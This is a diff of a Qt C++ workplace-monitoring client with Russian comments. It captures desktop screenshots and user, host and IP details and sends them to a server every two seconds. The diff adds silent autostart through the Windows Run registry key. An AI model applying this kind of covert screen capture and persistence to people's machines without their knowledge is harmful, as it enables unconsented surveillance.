@@ -5,11 +5,11 @@
 #include <QNetworkInterface>
 #include <QSysInfo>
 #include <QTimer>
+#include <QSettings>
 
 #include <QPixmap>
-#include <QDesktopWidget>
 #include <QBuffer>
-
+#include <QScreen>
 
 // Функция для создания клиента и установки соединения с сервером
 void connectToServer()
@@ -42,17 +42,18 @@ void connectToServer()
     }
     QString userName = qgetenv("USERNAME"); // Для Windows
 
-
-    QPixmap px = QPixmap::grabWindow(QApplication::desktop()->winId());
-    QPixmap screenshot = px.scaled(480, 270);
+    // Получение скриншота рабочего стола
+    QScreen *primaryScreen = QGuiApplication::primaryScreen();
+    QPixmap screenshot = primaryScreen->grabWindow(0);
+    QPixmap scaledScreenshot = screenshot.scaled(384, 216);
     QByteArray screenshotData;
     QBuffer buffer(&screenshotData);
     buffer.open(QIODevice::WriteOnly);
-    screenshot.save(&buffer, "PNG");
+    scaledScreenshot.save(&buffer, "PNG");
 
     // Создание строки данных, включающей время, домен, компьютер, IP-адрес и пользователя
     QString data = domain + computerName + ipAddress + userName +
-            "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString + ",";
+                   "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString + ",";
 
     // Отправка данных на сервер
     socket->write(data.toUtf8());
@@ -71,10 +72,21 @@ int main(int argc, char *argv[])
 {
     QApplication a(argc, argv);
 
+    QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
+
+    // Проверяем, есть ли уже настройка для автозапуска
+    bool isAutoStartEnabled = settings.contains("monitoring-work-activity-client");
+
+    if (!isAutoStartEnabled) {
+        // Если настройка отсутствует, добавляем приложение в автозагрузку
+        QString appPath = QApplication::applicationFilePath();
+        settings.setValue("monitoring-work-activity-client", appPath);
+    }
+
     // Установка таймера для повторного подключения к серверу
     QTimer timer;
     QObject::connect(&timer, &QTimer::timeout, &connectToServer);
-    timer.start(1000); // Интервал повторного подключения (в миллисекундах)
+    timer.start(2000); // Интервал повторного подключения (в миллисекундах)
 
     // Подключение к серверу при запуске клиента
     connectToServer();
